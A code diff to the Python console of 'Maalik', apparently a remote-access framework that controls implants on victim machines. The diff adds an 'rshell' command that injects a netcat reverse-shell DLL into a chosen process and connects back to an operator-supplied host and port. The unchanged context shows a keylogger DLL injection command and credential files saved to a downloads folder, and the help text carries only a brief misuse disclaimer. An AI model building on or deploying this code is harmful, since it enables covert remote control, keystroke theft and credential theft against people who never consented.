@@ -740,6 +740,15 @@ Open Ports
                     print("-------------------------")
                     print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")
 
+                elif(main == "rshell"):
+                    host = prompt("[+] Reverse Host : ")
+                    port = prompt("[+] Reverse Port : ")
+                    if(len(host) > 0):
+                        if(len(port) > 0):
+                            SendPayloadCommand(host+":"+port)
+                            DLLTransfer("payloads/ncshell.dll", setting('inject_process'))
+                            self.WaitForReply()
+                            RemovePayloadCommand()
                 elif(main == "keylog_start"):
                     DLLTransfer("payloads/keylogger.dll", setting('inject_process'))
 
@@ -1156,15 +1165,28 @@ def Console():
                 elif(x == "help"):
                     print(Style.BRIGHT + Fore.GREEN + 
                         """
-                        Maalik
+                        Maalik Framework
                         ---------------
                         -> Commands : 
                         -. help - Print this help message.
                         -. sessions - View online clients.
                         -. session - interact with a session.
-                        -. build - Build FHDAWN.
+                        -. build - Build Fhdawn.
                         -. kill - Kill session.
                         -. exit - Exit Maalik.
+
+                        Use the help command inside a session to view Session specific help.
+
+                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
+                        Created by : QuantumCore (Fahad) 
+                        Website : https://quantumcored.com
+                        Email : quantumcore@protonmail.com
+                        Discord : https://discordapp.com/invite/8snh7nx
+                        Github Repository : https://github.com/quantumcored/maalik
+
+                        If you find any bugs, Please Report them here : https://github.com/quantumcored/maalik/issues
+                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
+                        The Developer is not responsible for any misuse of Damage caused by the program. This is created only to innovate Network Security and YOU.
                         """
                         + Style.RESET_ALL)
                 elif(x == "build"):
